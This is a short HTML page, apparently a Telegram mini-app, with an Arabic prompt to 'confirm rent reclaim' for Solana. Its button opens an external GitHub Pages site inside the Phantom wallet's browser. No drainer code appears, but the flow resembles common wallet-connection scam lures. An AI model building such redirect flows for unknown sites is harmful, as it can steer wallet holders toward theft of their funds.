<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NotBot SOL Reclaimer</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
        body { background-color: #0b0e14; color: #ffffff; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; text-align: center; }
        .card { background: #151a23; border: 1px solid #232a3b; border-radius: 16px; padding: 24px; width: 100%; max-width: 380px; }
        .btn { background: #ab9ff2; color: #0b0e14; border: none; border-radius: 12px; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h1>تأكيد استرداد الرنت ⚡</h1>
        <button class="btn" onclick="handleWalletAction()">⚡ فتح وتأكيد في Phantom</button>
        <div id="statusText" style="margin-top:15px; color:#38bdf8;"></div>
    </div>
    <script>
        function handleWalletAction() {
            const targetUrl = "https://shenouda77.github.io/notbot-app/";
            const encodedUrl = encodeURIComponent(targetUrl);
            const phantomUri = "phantom://browse/" + encodedUrl;
            const phantomUniversal = "https://phantom.app/ul/browse/" + encodedUrl;
            
            window.location.href = phantomUri;
            setTimeout(() => {
                window.location.href = phantomUniversal;
            }, 800);
        }
    </script>
</body>
</html>
